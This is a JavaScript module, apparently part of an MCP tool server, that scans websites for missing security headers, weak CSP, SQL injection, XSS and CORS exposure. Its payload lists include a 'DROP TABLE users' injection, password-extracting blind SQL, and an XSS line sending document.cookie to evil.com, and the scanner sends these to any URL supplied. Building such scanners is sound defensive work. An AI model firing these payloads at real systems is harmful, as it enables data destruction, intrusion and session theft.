'use strict';

// Handler: security (open-source security scanning)
// 提供基础安全扫描能力：HTTP安全头部检查、CSP分析、SQL注入扫描、XSS扫描、OWASP Top 10。
// 使用浏览器 fetch API 在页面上下文中发送请求，分析响应头和响应体。

const { mcpError, mcpParamMissing } = require('../core/mcp-error');

const tools = [
  'security_headers_check',
  'security_csp_analyze',
  'security_sql_injection_scan',
  'security_xss_scan',
  'security_owasp_top10',
  'api_probe'
];

// 在浏览器上下文中发送 fetch 请求并收集响应信息
async function fetchInBrowser(target, url, options = {}) {
  const script = `(async () => {
    const r = await fetch(${JSON.stringify(url)}, ${JSON.stringify({ method: options.method || 'GET', headers: options.headers || {}, body: options.body })});
    const text = await r.text();
    const headers = {};
    r.headers.forEach((v, k) => headers[k] = v);
    return JSON.stringify({ status: r.status, statusText: r.statusText, headers, body: text.substring(0, ${options.maxBody || 5000}), bodyLength: text.length });
  })()`;
  return JSON.parse(await target.evaluate(script));
}

// 在 Node.js 中发送 fetch 请求（Node 18+ 内置 fetch）
async function fetchInNode(url, options = {}) {
  const r = await fetch(url, { method: options.method || 'GET', headers: options.headers || {}, body: options.body });
  const text = await r.text();
  const headers = {};
  r.headers.forEach((v, k) => headers[k] = v);
  return { status: r.status, statusText: r.statusText, headers, body: text.substring(0, options.maxBody || 5000), bodyLength: text.length };
}

// 统一的 fetch 函数：优先使用浏览器，回退到 Node.js
async function smartFetch(target, url, options = {}) {
  if (target) {
    try {
      return await fetchInBrowser(target, url, options);
    } catch (e) {
      // 浏览器 fetch 失败（CORS 等），回退到 Node.js
    }
  }
  return await fetchInNode(url, options);
}

// ====== security_headers_check ======
async function securityHeadersCheck(target, url) {
  const resp = await smartFetch(target, url);

  const securityHeadersList = [
    { header: 'content-security-policy', short: 'CSP', severity: 'high', description: '防止 XSS 和数据注入攻击' },
    { header: 'x-content-type-options', short: 'XCTO', severity: 'medium', description: '禁止 MIME 嗅探' },
    { header: 'x-frame-options', short: 'XFO', severity: 'medium', description: '防止点击劫持' },
    { header: 'strict-transport-security', short: 'HSTS', severity: 'medium', description: '强制 HTTPS' },
    { header: 'referrer-policy', short: 'RP', severity: 'low', description: '控制 Referrer 信息泄露' },
    { header: 'x-xss-protection', short: 'XSSP', severity: 'low', description: 'XSS 过滤器（旧版浏览器）' },
    { header: 'permissions-policy', short: 'PP', severity: 'low', description: '控制浏览器功能权限' }
  ];

  const headers = {};
  for (const [k, v] of Object.entries(resp.headers)) headers[k.toLowerCase()] = v;

  const present = [];
  const missing = [];
  let score = 0;
  const maxScore = securityHeadersList.length;

  for (const h of securityHeadersList) {
    const value = headers[h.header];
    if (value !== undefined && value !== null && value !== '') {
      present.push({ header: h.header, short: h.short, value: value.substring(0, 200), description: h.description });
      score++;
    } else {
      missing.push({ header: h.header, short: h.short, severity: h.severity, description: h.description, recommendation: `添加 ${h.header} 响应头` });
    }
  }

  // 检查 X-Powered-By 等信息泄露
  const infoLeak = [];
  if (headers['x-powered-by']) infoLeak.push({ header: 'x-powered-by', value: headers['x-powered-by'], risk: '泄露后端框架信息' });
  if (headers['server']) infoLeak.push({ header: 'server', value: headers['server'], risk: '泄露服务器软件信息' });

  return {
    url,
    statusCode: resp.status,
    score: `${score}/${maxScore}`,
    mode: 'api',
    risk: score < 2 ? 'high' : score < 4 ? 'medium' : 'low',
    present,
    missing,
    infoLeak: infoLeak.length > 0 ? infoLeak : undefined
  };
}

// ====== security_csp_analyze ======
async function securityCspAnalyze(target, url) {
  const resp = await smartFetch(target, url);
  const csp = resp.headers['content-security-policy'] || null;

  if (!csp) {
    return {
      url,
      csp: null,
      findings: [{ type: 'csp', severity: 'high', evidence: 'No Content-Security-Policy header', recommendation: 'Implement CSP to prevent XSS and data injection attacks' }],
      score: 0
    };
  }

  const findings = [];
  let score = 100;

  // 解析 CSP 指令
  const directives = {};
  csp.split(';').forEach(d => {
    const parts = d.trim().split(/\s+/);
    if (parts.length > 0) {
      directives[parts[0]] = parts.slice(1);
    }
  });

  // 检查不安全指令
  const unsafeChecks = [
    { directive: 'script-src', pattern: /'unsafe-inline'/, severity: 'high', msg: "script-src 包含 'unsafe-inline'，允许内联脚本，存在 XSS 风险" },
    { directive: 'script-src', pattern: /'unsafe-eval'/, severity: 'high', msg: "script-src 包含 'unsafe-eval'，允许 eval()，存在代码注入风险" },
    { directive: 'style-src', pattern: /'unsafe-inline'/, severity: 'medium', msg: "style-src 包含 'unsafe-inline'，允许内联样式" },
    { directive: 'default-src', pattern: /\*/, severity: 'high', msg: 'default-src 使用通配符 *，允许从任意来源加载资源' },
    { directive: 'script-src', pattern: /\*/, severity: 'high', msg: 'script-src 使用通配符 *，允许从任意来源加载脚本' },
    { directive: 'connect-src', pattern: /\*/, severity: 'medium', msg: 'connect-src 使用通配符 *，允许连接任意来源' },
    { directive: 'img-src', pattern: /\*/, severity: 'low', msg: 'img-src 使用通配符 *' }
  ];

  for (const check of unsafeChecks) {
    const dirValue = directives[check.directive];
    if (dirValue && dirValue.some(v => check.pattern.test(v))) {
      findings.push({ type: 'csp', directive: check.directive, severity: check.severity, evidence: check.msg, recommendation: `移除不安全的指令值` });
      score -= check.severity === 'high' ? 25 : check.severity === 'medium' ? 15 : 5;
    }
  }

  // 检查缺失的关键指令
  const requiredDirectives = ['default-src', 'script-src', 'style-src', 'img-src', 'connect-src'];
  for (const dir of requiredDirectives) {
    if (!directives[dir] && !directives['default-src']) {
      findings.push({ type: 'csp', directive: dir, severity: 'medium', evidence: `缺失 ${dir} 指令`, recommendation: `添加 ${dir} 指令` });
      score -= 10;
    }
  }

  // 检查 frame-ancestors
  if (!directives['frame-ancestors'] && !directives['default-src']) {
    findings.push({ type: 'csp', directive: 'frame-ancestors', severity: 'medium', evidence: '缺失 frame-ancestors 指令', recommendation: '添加 frame-ancestors 防止点击劫持' });
    score -= 10;
  }

  return {
    url,
    csp,
    directives,
    findings,
    score: Math.max(0, score)
  };
}

// ====== security_sql_injection_scan ======
async function securitySqlInjectionScan(target, url) {
  const payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "'; DROP TABLE users; --",
    "' UNION SELECT NULL --",
    "' UNION SELECT NULL, NULL --",
    "' UNION SELECT NULL, NULL, NULL --",
    "admin'--",
    "admin' OR '1'='1'--",
    "1' OR 1=1#",
    "' OR ''='",
    "') OR ('1'='1",
    "1; SELECT * FROM users",
    "' AND SLEEP(5)--",
    "' AND BENCHMARK(1000000,MD5(1))--",
    "1' ORDER BY 1--",
    "1' ORDER BY 10--",
    "' OR EXISTS(SELECT*FROM users)--",
    "' OR 1=1 LIMIT 1--",
    "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>50--"
  ];

  const findings = [];
  const tested = [];
  const baseUrl = url.split('?')[0];
  const hasQuery = url.includes('?');

  for (const payload of payloads) {
    let testUrl;
    if (hasQuery) {
      testUrl = url + '&test=' + encodeURIComponent(payload);
    } else {
      testUrl = baseUrl + '?test=' + encodeURIComponent(payload);
    }

    try {
      const resp = await smartFetch(target, testUrl, { maxBody: 3000 });
      const body = (resp.body || '').toLowerCase();
      tested.push({ payload: payload.substring(0, 40), status: resp.status, bodyLength: resp.bodyLength });

      // 检测 SQL 错误信息泄露
      const sqlErrors = [
        'sql syntax',
        'mysql_fetch',
        'ora-',
        'sqlstate',
        'pg_query',
        'microsoft sql server',
        'sqlite3::query',
        'warning: mysql',
        'you have an error in your sql syntax',
        'unclosed quotation mark',
        'odbc sql server driver',
        'sql command not properly ended'
      ];

      for (const err of sqlErrors) {
        if (body.includes(err)) {
          findings.push({
            type: 'sql_injection',
            severity: 'critical',
            payload,
            evidence: `响应中包含 SQL 错误信息: "${err}"`,
            testUrl: testUrl.substring(0, 200),
            recommendation: '使用参数化查询，禁止拼接 SQL 字符串'
          });
          break;
        }
      }

      // 检测基于时间的盲注（简单检查响应时间差异）
      if (/sleep|benchmark/i.test(payload) && resp.bodyLength > 0) {
        // 时间差异检测需要多次测量，这里只标记
      }
    } catch (e) {
      tested.push({ payload: payload.substring(0, 40), error: e.message });
    }
  }

  return {
    url,
    findings,
    totalPayloads: payloads.length,
    testedCount: tested.length
  };
}

// ====== security_xss_scan ======
async function securityXssScan(target, url) {
  const payloads = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><script>alert(1)</script>',
    "javascript:alert(1)",
    '<body onload=alert(1)>',
    '<iframe src=javascript:alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "';alert(1);//",
    '<script>document.cookie</script>',
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '{{constructor.constructor("alert(1)")()}}',
    '${alert(1)}',
    '<details open ontoggle=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<select onfocus=alert(1) autofocus>',
    '<textarea onfocus=alert(1) autofocus>',
    '<keygen onfocus=alert(1) autofocus>',
    '<video><source onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<a href=javascript:alert(1)>click</a>',
    '<form action=javascript:alert(1)><input type=submit>',
    '<object data=javascript:alert(1)>',
    '<embed src=javascript:alert(1)>',
    '<script>fetch("https://evil.com?c="+document.cookie)</script>',
    '<style>@import "javascript:alert(1)"</style>'
  ];

  const findings = [];
  const tested = [];
  const baseUrl = url.split('?')[0];
  const hasQuery = url.includes('?');

  for (const payload of payloads) {
    let testUrl;
    if (hasQuery) {
      testUrl = url + '&q=' + encodeURIComponent(payload);
    } else {
      testUrl = baseUrl + '?q=' + encodeURIComponent(payload);
    }

    try {
      const resp = await smartFetch(target, testUrl, { maxBody: 5000 });
      const body = resp.body || '';
      tested.push({ payload: payload.substring(0, 50), status: resp.status, bodyLength: resp.bodyLength });

      // 检测 payload 是否在响应中未被转义地出现
      if (body.includes(payload) || body.includes(decodeURIComponent(payload))) {
        findings.push({
          type: 'xss',
          severity: 'high',
          payload,
          evidence: `响应体中未转义地包含了 XSS payload`,
          testUrl: testUrl.substring(0, 200),
          recommendation: '对所有用户输入进行 HTML 实体编码，使用 Content-Security-Policy 限制脚本来源'
        });
      }

      // 检测部分匹配（payload 被部分过滤）
      const partialMatch = payload.replace(/<script>|<\/script>/g, '');
      if (partialMatch && body.includes(partialMatch) && !body.includes(payload)) {
        findings.push({
          type: 'xss',
          severity: 'medium',
          payload,
          evidence: `响应体中部分包含了 XSS payload（可能存在不完全的过滤）`,
          testUrl: testUrl.substring(0, 200),
          recommendation: '检查 XSS 过滤逻辑是否完整'
        });
      }
    } catch (e) {
      tested.push({ payload: payload.substring(0, 50), error: e.message });
    }
  }

  return {
    url,
    findings,
    totalPayloads: payloads.length,
    testedCount: tested.length
  };
}

// ====== security_owasp_top10 ======
async function securityOwaspTop10(target, url) {
  const resp = await smartFetch(target, url);
  const headers = {};
  for (const [k, v] of Object.entries(resp.headers)) headers[k.toLowerCase()] = v;

  const checks = [];

  // A1: Broken Access Control
  const hasAuth = headers['www-authenticate'] !== undefined || resp.status === 401 || resp.status === 403;
  checks.push({
    id: 'A1', name: 'Broken Access Control', check: 'access_control',
    status: hasAuth ? 'pass' : 'warn',
    evidence: hasAuth ? '检测到认证机制' : '未检测到认证机制（可能为公开页面）'
  });

  // A2: Cryptographic Failures
  const isHttps = url.startsWith('https://');
  const hasHsts = headers['strict-transport-security'] !== undefined;
  checks.push({
    id: 'A2', name: 'Cryptographic Failures', check: 'crypto',
    status: isHttps ? (hasHsts ? 'pass' : 'warn') : 'fail',
    evidence: isHttps ? (hasHsts ? '使用 HTTPS 且配置了 HSTS' : '使用 HTTPS 但未配置 HSTS') : '使用 HTTP 而非 HTTPS'
  });

  // A3: Injection
  checks.push({
    id: 'A3', name: 'Injection', check: 'injection',
    status: 'info',
    evidence: '建议使用 security_sql_injection_scan 和 security_xss_scan 进行深度测试'
  });

  // A4: Insecure Design
  checks.push({
    id: 'A4', name: 'Insecure Design', check: 'design',
    status: 'info',
    evidence: '需要架构审查'
  });

  // A5: Security Misconfiguration
  const hasXcto = headers['x-content-type-options'] !== undefined;
  const hasXfo = headers['x-frame-options'] !== undefined;
  const hasCsp = headers['content-security-policy'] !== undefined;
  const poweredBy = headers['x-powered-by'];
  const serverHeader = headers['server'];
  const misconfigIssues = [];
  if (!hasXcto) misconfigIssues.push('缺失 X-Content-Type-Options');
  if (!hasXfo) misconfigIssues.push('缺失 X-Frame-Options');
  if (!hasCsp) misconfigIssues.push('缺失 Content-Security-Policy');
  if (poweredBy) misconfigIssues.push(`X-Powered-By 泄露: ${poweredBy}`);
  if (serverHeader) misconfigIssues.push(`Server 头泄露: ${serverHeader}`);
  checks.push({
    id: 'A5', name: 'Security Misconfiguration', check: 'config',
    status: misconfigIssues.length === 0 ? 'pass' : misconfigIssues.length <= 2 ? 'warn' : 'fail',
    evidence: misconfigIssues.length === 0 ? '安全配置良好' : misconfigIssues.join('; ')
  });

  // A6: Vulnerable and Outdated Components
  checks.push({
    id: 'A6', name: 'Vulnerable and Outdated Components', check: 'components',
    status: 'info',
    evidence: poweredBy ? `检测到框架: ${poweredBy}，建议检查已知漏洞` : '需要依赖扫描'
  });

  // A7: Authentication Failures
  checks.push({
    id: 'A7', name: 'Authentication and Session Management Failures', check: 'auth',
    status: hasAuth ? 'info' : 'warn',
    evidence: hasAuth ? '检测到认证机制，需要深度测试' : '未检测到认证机制'
  });

  // A8: Software and Data Integrity Failures
  checks.push({
    id: 'A8', name: 'Software and Data Integrity Failures', check: 'integrity',
    status: 'info',
    evidence: '需要完整性验证（SRI、签名等）'
  });

  // A9: Security Logging and Monitoring Failures
  checks.push({
    id: 'A9', name: 'Security Logging and Monitoring Failures', check: 'logging',
    status: 'info',
    evidence: '需要日志审计'
  });

  // A10: Server-Side Request Forgery (SSRF)
  checks.push({
    id: 'A10', name: 'Server-Side Request Forgery', check: 'ssrf',
    status: 'info',
    evidence: '需要 SSRF 测试'
  });

  const passed = checks.filter(c => c.status === 'pass').length;
  const failed = checks.filter(c => c.status === 'fail').length;
  const warned = checks.filter(c => c.status === 'warn').length;

  return {
    url,
    checks,
    passed,
    failed,
    warned,
    summary: `${passed} passed, ${failed} failed, ${warned} warned, ${checks.length - passed - failed - warned} info`
  };
}

async function handle(name, args, deps) {
  let { page: target, ensurePage } = deps;
  const text = deps.text || ((t) => t);

  // 安全工具可以在无浏览器的情况下工作（使用 Node.js fetch）
  // 但如果有打开的页面，优先使用浏览器上下文（可处理需要认证的请求）
  if (ensurePage) {
    try { ({ target } = await ensurePage()); } catch (_) { target = null; }
  }

  try {
    // ====== security_headers_check ======
    if (name === 'security_headers_check') {
      const url = args.url;
      if (!url) return mcpParamMissing('url', name, '请提供目标 URL');
      const result = await securityHeadersCheck(target, url);
      return text(JSON.stringify({
        ...result,
        nextSteps: ['使用 security_csp_analyze 深度分析 CSP 策略', '使用 security_owasp_top10 执行 OWASP Top 10 检查'],
        suggestions: [{ type: 'next', tool: 'security_csp_analyze', reason: '深度分析 Content-Security-Policy' }]
      }, null, 2));
    }

    // ====== security_csp_analyze ======
    if (name === 'security_csp_analyze') {
      const url = args.url;
      if (!url) return mcpParamMissing('url', name, '请提供目标 URL');
      const result = await securityCspAnalyze(target, url);
      return text(JSON.stringify({
        ...result,
        nextSteps: ['使用 security_headers_check 检查所有安全头部', '使用 security_xss_scan 测试 XSS 漏洞'],
        suggestions: [{ type: 'next', tool: 'security_headers_check', reason: '检查其他安全头部' }]
      }, null, 2));
    }

    // ====== security_sql_injection_scan ======
    if (name === 'security_sql_injection_scan') {
      const url = args.url;
      if (!url) return mcpParamMissing('url', name, '请提供目标 URL（可包含查询参数）');
      const result = await securitySqlInjectionScan(target, url);
      return text(JSON.stringify({
        ...result,
        nextSteps: ['使用 security_xss_scan 测试 XSS 漏洞', '使用 security_owasp_top10 执行全面安全检查'],
        suggestions: [{ type: 'next', tool: 'security_xss_scan', reason: '测试跨站脚本漏洞' }]
      }, null, 2));
    }

    // ====== security_xss_scan ======
    if (name === 'security_xss_scan') {
      const url = args.url;
      if (!url) return mcpParamMissing('url', name, '请提供目标 URL（可包含查询参数）');
      const result = await securityXssScan(target, url);
      return text(JSON.stringify({
        ...result,
        nextSteps: ['使用 security_sql_injection_scan 测试 SQL 注入', '使用 security_csp_analyze 分析 CSP 策略'],
        suggestions: [{ type: 'next', tool: 'security_sql_injection_scan', reason: '测试 SQL 注入漏洞' }]
      }, null, 2));
    }

    // ====== security_owasp_top10 ======
    if (name === 'security_owasp_top10') {
      const url = args.url;
      if (!url) return mcpParamMissing('url', name, '请提供目标 URL');
      const result = await securityOwaspTop10(target, url);
      return text(JSON.stringify({
        ...result,
        nextSteps: ['使用 security_headers_check 检查安全头部', '使用 security_sql_injection_scan 测试注入', '使用 security_xss_scan 测试 XSS'],
        suggestions: [
          { type: 'next', tool: 'security_headers_check', reason: '详细检查安全头部' },
          { type: 'next', tool: 'security_sql_injection_scan', reason: '测试 SQL 注入' }
        ]
      }, null, 2));
    }

    // ====== api_probe ======
    if (name === 'api_probe') {
      const url = args.url;
      if (!url) return mcpParamMissing('url', name, '请提供目标 API URL');
      const methods = args.methods || ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'];
      const headers = args.headers || {};
      const body = args.body;
      const checkCors = args.checkCors !== false;

      const results = [];
      for (const method of methods) {
        try {
          const opts = { method, headers, maxBody: 2000 };
          if (body && ['POST', 'PUT', 'PATCH'].includes(method)) opts.body = body;
          const resp = await smartFetch(target, url, opts);
          const respHeaders = {};
          for (const [k, v] of Object.entries(resp.headers)) respHeaders[k.toLowerCase()] = v;

          const entry = {
            method,
            status: resp.status,
            statusText: resp.statusText,
            contentType: respHeaders['content-type'] || null,
            bodyLength: resp.bodyLength,
            bodyPreview: (resp.body || '').substring(0, 200),
            responseTime: null
          };

          if (checkCors && method === 'OPTIONS') {
            entry.cors = {
              allowOrigin: respHeaders['access-control-allow-origin'] || null,
              allowMethods: respHeaders['access-control-allow-methods'] || null,
              allowHeaders: respHeaders['access-control-allow-headers'] || null,
              allowCredentials: respHeaders['access-control-allow-credentials'] || null,
              maxAge: respHeaders['access-control-max-age'] || null
            };
          }

          if (checkCors && method === 'GET') {
            entry.corsOrigin = respHeaders['access-control-allow-origin'] || null;
          }

          results.push(entry);
        } catch (e) {
          results.push({ method, error: e.message });
        }
      }

      // CORS 分析
      let corsAnalysis = null;
      if (checkCors) {
        const getEntry = results.find(r => r.method === 'GET');
        const optionsEntry = results.find(r => r.method === 'OPTIONS');
        const acao = getEntry?.corsOrigin || optionsEntry?.cors?.allowOrigin;
        corsAnalysis = {
          allowOrigin: acao,
          risk: acao === '*' ? 'high' : acao ? 'medium' : 'low',
          note: acao === '*' ? 'CORS 完全开放，任意来源可跨域访问' : acao ? `仅允许来源: ${acao}` : '未设置 CORS 或仅同源访问'
        };
      }

      return text(JSON.stringify({
        url,
        results,
        corsAnalysis,
        nextSteps: ['使用 security_headers_check 检查安全头部', '使用 security_owasp_top10 执行 OWASP 检查'],
        suggestions: [{ type: 'next', tool: 'security_headers_check', reason: '检查 API 安全头部' }]
      }, null, 2));
    }

    return mcpError(`未知工具（security）: ${name}`, { error: 'UNKNOWN_TOOL', toolName: name });
  } catch (e) {
    return mcpError(`安全扫描执行失败: ${e.message}`, {
      error: 'EXECUTION_ERROR',
      reason: e.message,
      suggestion: '请检查目标 URL 是否可访问，或稍后重试',
      toolName: name
    });
  } finally {
    Object.assign(deps, { page: target });
  }
}

module.exports = { tools, handle };
